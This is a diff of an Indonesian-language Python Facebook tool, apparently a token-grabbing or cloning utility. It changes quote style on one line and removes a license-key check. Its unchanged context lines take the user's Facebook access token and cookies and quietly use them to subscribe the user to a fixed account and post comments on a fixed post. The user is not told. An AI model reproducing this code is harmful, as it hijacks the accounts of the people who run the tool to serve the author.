@@ -449,7 +449,7 @@ def login_lagi334():
 									tok1 = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
 									open(".token1.txt","w").write(tok1)
 									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok1}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAB [bold green]<"))
-									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok1))
+									requests.post('https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s'%(tok1))
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok1}", headers = {"cookie":your_cookies})
@@ -494,32 +494,6 @@ def followdong():
 	
 #----------------[ BAGIAN-MENU ]----------------#
 def menu(my_name,my_id):
-    try:
-        lisen = open('key.txt','r').read()
-        met = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyI2NjMxOTcyOCIsIlhVUE9xTFIvTTNQc0hSUm4rUDhSSitjUjhKd1JSQnpXZDVHUklxWEkiXQ==&ProductId=22574&Key='+lisen).json()
-        men = met['licenseKey']
-        key = men['key'][0:11]
-        tahun = men['expires'][0:4]
-        buln = men['expires'][5:7]
-        tanggal = men['expires'][8:10]
-        bulan = dic2[buln]
-        tahun1 = men['created'][0:4]
-        buln1 = men['created'][5:7]
-        tanggal1 = men['created'][8:10]
-        bulan1 = dic2[buln1]
-    except:
-        key = "-"
-        tanggal = "-"
-        bulan = "-"
-        tahun = "-"
-        tanggal1 = "-"
-        bulan1 = "-"
-        tahun1 = "-"
-    try:
-        sen = open("key.txt","r").read()
-        prem = f"{H2}Iya"
-    except (KeyError,FileNotFoundError):
-        prem = f"{K2}Iya"
     try:
         tokenx = open('.token1.txt','r').read()
         tokenmu.append(tokenx)
